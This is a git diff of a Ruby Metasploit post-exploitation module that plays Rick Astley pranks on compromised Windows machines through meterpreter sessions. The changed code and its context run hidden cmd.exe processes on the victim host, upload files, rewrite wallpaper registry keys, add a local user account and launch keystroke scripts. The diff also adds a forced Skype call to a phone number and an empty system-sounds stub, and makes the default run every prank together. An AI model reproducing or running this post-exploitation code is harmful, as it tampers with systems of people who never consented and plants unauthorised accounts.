@@ -14,7 +14,7 @@ class Metasploit3 < Msf::Post
 					Of course this is last minute shit for the hacker meeting.
 			},
 			'License'       => MSF_LICENSE,
-			'Author'        => [ 'DJ Manila Ice', 'Ian Parker', 'crymsen', 'porkchop', 'BMack'], 
+			'Author'        => [ 'DJ Manila Ice', 'iParker', 'crymsen', 'porkchop', 'BMack'], 
 			'Version'       => '1',
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
@@ -41,16 +41,23 @@ class Metasploit3 < Msf::Post
 			add_rick_astley_user
 		elsif datastore["COMMAND"].eql? "keystroke"
 			install_keystrokes
+		elsif datastore["COMMAND"].eql? "systemsounds"
+			rickify_system_sounds	
+		elsif datastore["COMMAND"].eql? "rickastleyhotline"
+			call_the_rick_astley_hotline	
 		elsif datastore["COMMAND"].eql? "music" and not datastore["PATH"].nil? 
 			change_music
 		else
-			# do this by default for now
-			#make_rick_astley_cursor
-			#4.times do
-			#launchIERickRoll
-			#end			
-			#add_rick_astley_user
+			# Turn off the keyboard
+			# run all the methods
+			make_rick_astley_cursor
 			print_rick_to_default_printer
+			change_background
+			add_rick_astley_user
+			install_keystrokes
+			change_music		
+			launch_video
+			# Turn back on the keyboard
 		end
 	end
 	
@@ -143,7 +150,7 @@ class Metasploit3 < Msf::Post
 		print_status "uploading to => " + temp_picture
 		session.fs.file.upload_file("#{temp_picture}", rick_png)
 
-		print_status("Printing rick out to the default printer")
+		print_status("Printing Rick out to the default printer")
 		session.sys.process.execute("cmd.exe /c mspaint.exe /pt \"#{temp_picture}\"", nil, {'Hidden' => true})
 		print_status("Print execution completed!")
 	end
@@ -178,9 +185,6 @@ class Metasploit3 < Msf::Post
 		if(key)
 			registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","Wallpaper","#{tempdir}\\#{wallpaper}","REG_SZ")
 
-			# Setting the base color isn't working right now
-			# registry_setvaldata("#{key}\\Control\ Panel\\Colors\\","Background","#{bgcolor}","REG_SZ") 
-
 			registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","TileWallpaper","0","REG_SZ")
 			print_status("Set Wallpaper to #{tempdir}"+"\\"+"#{wallpaper}")
 		else
@@ -188,9 +192,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		#Refresh the users' desktop config
-		r = session.sys.process.execute(refresh_cmd, nil, {'Hidden' => true, 'Channelized' => true})
-		r.channel.close
-		r.close
+		session.sys.process.execute(refresh_cmd, nil, {'Hidden' => true, 'Channelized' => true})
 	end
 	
 	def change_music
@@ -237,7 +239,19 @@ class Metasploit3 < Msf::Post
 
                 session.sys.process.execute("cmd.exe /c \"#{temp_keystroke}\"", nil, {'Hidden' => true})
                 print_status "Keystroke Lyrics launch completed!"		
+	end
+	
+	def rickify_system_sounds
+		sysinfo = session.sys.config.sysinfo
+                winver = sysinfo["OS"]		
+		if winver == "Windows 7"
+		elsif winver == "Windows XP"
+		end
+	end
 
+	def call_the_rick_astley_hotline
+		skype = "\"C:\\Program Files\\Skype\\Phone\\Skype.exe\""
+                session.sys.process.execute("#{skype} /callto:+17722574501", nil, {'Hidden' => false})
 	end
 
 end
